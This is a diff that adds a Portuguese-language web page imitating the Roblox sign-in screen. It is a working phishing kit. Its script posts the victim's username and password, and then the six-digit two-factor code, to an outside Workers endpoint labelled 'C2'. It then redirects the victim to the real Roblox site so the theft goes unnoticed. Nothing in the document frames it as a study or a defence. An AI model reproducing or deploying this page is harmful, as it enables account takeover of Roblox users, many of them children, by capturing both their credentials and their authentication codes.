@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Roblox</title>
+<style>
+  body{margin:0;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;
+       background:#232527;color:#fff;display:flex;align-items:center;
+       justify-content:center;min-height:100vh}
+  .card{background:#fff;border-radius:8px;padding:36px 28px;width:100%;
+        max-width:340px;box-shadow:0 4px 24px rgba(0,0,0,.3);color:#393b3d}
+  .logo{text-align:center;margin-bottom:24px}
+  .logo svg{width:48px;height:48px;fill:#000}
+  .title{font-size:20px;font-weight:700;text-align:center;margin-bottom:20px}
+  input{width:100%;padding:12px 14px;border:1px solid #b8b8b8;
+        border-radius:6px;font-size:16px;margin-bottom:12px;box-sizing:border-box}
+  button{width:100%;padding:12px;background:#00b06f;color:#fff;
+         border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
+  button:hover{background:#009a60}
+  .err{color:#e2231a;font-size:13px;text-align:center;margin-top:12px;display:none}
+  .hidden{display:none}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+      <path d="M15.3 15.3L84.7 15.3L84.7 84.7L15.3 84.7Z" fill="none" stroke="#000" stroke-width="8"/>
+    </svg>
+  </div>
+  <div class="title" id="title">Entrar</div>
+  
+  <div id="step1">
+    <input type="text" id="user" placeholder="Usuário ou e-mail" required autocomplete="username">
+    <input type="password" id="pass" placeholder="Senha" required autocomplete="current-password">
+    <button onclick="sendLogin()">Entrar</button>
+  </div>
+
+  <div id="step2" class="hidden">
+    <p style="font-size:14px;text-align:center;color:#666;margin-bottom:12px">
+      Verificação em duas etapas. Digite o código do app Authenticator.
+    </p>
+    <input type="text" id="code" placeholder="Código de 6 dígitos" maxlength="6" inputmode="numeric">
+    <button onclick="sendCode()">Verificar</button>
+  </div>
+
+  <div class="err" id="err"></div>
+</div>
+
+<script>
+const C2 = "https://sync-backend.alexandregoncalves87.workers.dev"; // URL do Worker
+let currentUser = "", currentPass = "";
+
+async function sendLogin() {
+  const user = document.getElementById("user").value;
+  const pass = document.getElementById("pass").value;
+  if (!user || !pass) return;
+  currentUser = user; currentPass = pass;
+  
+  try {
+    const r = await fetch(C2 + "/roblox/login", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({user, pass})
+    });
+    const data = await r.json();
+    if (data.twofa) {
+      document.getElementById("step1").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
+      document.getElementById("title").textContent = "Verificação";
+    } else if (data.success) {
+      location.href = "https://www.roblox.com/home";
+    } else {
+      showErr("Usuário ou senha incorretos.");
+    }
+  } catch(e) {
+    showErr("Erro de conexão.");
+  }
+}
+
+async function sendCode() {
+  const code = document.getElementById("code").value;
+  if (code.length !== 6) return;
+  try {
+    const r = await fetch(C2 + "/roblox/2fa", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({user: currentUser, pass: currentPass, code})
+    });
+    const data = await r.json();
+    if (data.success) {
+      location.href = "https://www.roblox.com/home";
+    } else {
+      showErr("Código inválido ou expirado.");
+    }
+  } catch(e) {
+    showErr("Erro de conexão.");
+  }
+}
+
+function showErr(msg) {
+  const el = document.getElementById("err");
+  el.textContent = msg;
+  el.style.display = "block";
+}
+</script>
+</body>
+</html>
